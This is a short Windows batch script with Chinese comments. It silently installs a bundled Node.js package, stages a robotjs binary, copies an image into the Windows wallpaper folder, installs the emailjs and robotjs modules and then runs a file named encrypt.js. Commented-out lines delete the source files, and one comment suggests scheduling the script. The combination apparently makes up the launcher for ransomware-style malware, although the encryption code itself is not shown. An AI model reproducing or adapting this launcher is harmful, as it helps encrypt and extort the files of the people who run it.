@echo off

rem 检测如果不是64位系统，直接退出程序
if not exist "%SystemDrive%\Program Files (x86)" exit
if exist %~dp0\nodex64.msi copy %~dp0\nodex64.msi %appdata%\nodex64.msi
rem if exist %~dp0\nodex64.msi del /f /q  %~dp0\nodex64.msi
if exist "%SystemDrive%\Program Files\nodejs" goto run
start /wait "" %appdata%\nodex64.msi /quiet

::安装robotjs并删除源文件
@set dest_path=%appdata%\npm-cache\_prebuilds
@if not exist %dest_path% md %dest_path%
@copy  %CUR_PATH%\robotx64.gz %dest_path%\https-github.com-octalmage-robotjs-releases-download-v0.4.7-robotjs-v0.4.7-node-v48-win32-x64.tar.gz
@rem del /s /q /f %CUR_PATH%\robot.gz

:run
::拷贝壁纸图片到系统盘并删除源文件
@set CUR_PATH=%cd%
@if not exist %WINDIR%\Web\Wallpaper md %WINDIR%\Web\Wallpaper
@copy %CUR_PATH%\123.jpg %WINDIR%\Web\Wallpaper.jpg
@rem del /s /q /f %CUR_PATH%\123.jpg

rem 这里也可以写一个计划任务,用于定时运行nd1.bat
"%SystemDrive%\Program Files\nodejs\npm.cmd" install emailjs
"%SystemDrive%\Program Files\nodejs\npm.cmd" install robotjs
"%SystemDrive%\Program Files\nodejs\node.exe" encrypt.js

exit


